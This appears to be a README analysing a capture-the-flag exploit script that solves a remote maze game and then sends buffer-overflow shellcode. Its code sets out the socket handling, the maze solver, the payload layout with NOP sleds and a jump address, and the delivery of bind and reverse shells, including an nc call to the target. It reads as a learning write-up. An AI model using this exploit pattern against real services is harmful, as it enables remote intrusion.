# Nethack.us-RobotMaze-RCE

The main file you need to look at is 'solve_maze.py'


# Exploit Script Analysis

## 1. Imports & Setup

```python
import os, sys
import socket, errno
from time import sleep

maze_size = 3741
conn = ('104.236.116.183', 9000)
```

- **`maze_size`** → size of the maze data in bytes expected from the server.  
- **`conn`** → the IP and port of the challenge server.  

---

## 2. Shellcode Definitions

```python
def shellcode():
    ...
    bind_shell = b"..."
    rev2 = b"..."
```

- **`bind_shell`** → raw x86 shellcode that opens a bind shell on port `4444`.  
- **`rev2`** → reverse shell shellcode that connects back to a specific IP and port.  
- **NOP sleds** (`\x90`) are added before and after to help the shellcode land in memory safely.  
- At the end:  
  ```python
  b'\xd3\x79\x0b\x08' # address to jump to ECX
  ```
  is likely an address in the vulnerable process's memory (little-endian format).  

The function **returns** the complete payload.

---

## 3. Socket Connection Functions

```python
def connect_sock():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(conn)
    sock.setblocking(False)
    return sock
```

- Connects to the target server.
- Sets non-blocking mode to avoid hanging during reads.

```python
def read_sock(sock, size):
    data = b""
    while len(data) < size:
        try:
            data += sock.recv(4096)
        except IOError as e:
            sleep(.2)
            if e.args[0] == errno.EAGAIN:
                continue
            else:
                print(e)
                sys.exit(0)
    return data
```

- Reads exactly `size` bytes from the socket, retrying if no data is ready (`EAGAIN`).

---

## 4. Maze Solver

Uses **recursive depth-first search (DFS)** to find the path.

```python
def solve_maze(y, x, maze):
    try:
        if maze[y][x] == 2:  # Goal
            return ""
        elif maze[y][x] == 1:  # Wall
            return "E"
        elif maze[y][x] == 3:  # Already visited
            return "E"
    except IndexError:
        return "E"

    maze[y][x] = 3  # mark visited

    ret = solve_maze(y+1, x, maze)
    if ret != "E": return "s" + ret

    ret = solve_maze(y, x-1, maze)
    if ret != "E": return "a" + ret

    ret = solve_maze(y-1, x, maze)
    if ret != "E": return "w" + ret

    ret = solve_maze(y, x+1, maze)
    if ret != "E": return "d" + ret

    return "E"
```

- Maze encoding:  
  - `0` → free space  
  - `1` → wall  
  - `2` → goal  
  - `3` → visited  

- Movement mapping:  
  - `"w"` = up  
  - `"s"` = down  
  - `"a"` = left  
  - `"d"` = right  

---

## 5. Maze Parsing

```python
def parse_maze(data):
    maze = []
    for y in range(43):
        xa = []
        for x in range(43):
            rx = (y*87) + (x*2)
            sym = data[rx:rx+2]
            if sym == b"[]":
                xa.append(1)  # wall
            elif sym == b"  " or sym == b"<>":
                xa.append(0)  # empty
        maze.append(xa)
    maze[42][41] = 2  # exit
    return maze
```

- Converts ASCII maze into a 2D grid of numbers.  
- Maze is **43 × 43 tiles**, each tile taking 2 bytes in ASCII form.  
- Bottom-right corner is marked as the exit.

---

## 6. Main Exploit Flow

```python
if __name__ == "__main__":
    sock = connect_sock()
    data = read_sock(sock, maze_size)

    maze = parse_maze(data)
    solve = solve_maze(0, 1, maze)

    print(data.decode())
    sock.send(solve.encode())

    recv_len = (len(solve) - 1) * maze_size + 56
    data = read_sock(sock, recv_len)

    print(data.decode())
    sock.send(shellcode())

    print("Dropping to shell ... ACTIVE\n")
    # os.system("nc " + conn[0] + " 4444")
```

**Step-by-step:**
1. Connects to the server.
2. Reads the maze data.
3. Parses the maze into a 2D grid.
4. Solves it from starting point `(0, 1)`.
5. Sends the movement string to the server.
6. Reads additional response data (likely per-move updates).
7. Sends the shellcode payload.
8. Prepares to connect to the shell (commented out).

---

## 7. What the script actually does

This is an **automated maze-solver + buffer overflow exploit**.

It connects to a remote server, completes a mini-game (maze), then uses a vulnerability (likely in how the server processes input) to inject shellcode.

The shellcode will then start a reverse shell and connect back to the attacker.

Once exploited, the attacker gains **remote command execution** on the target.
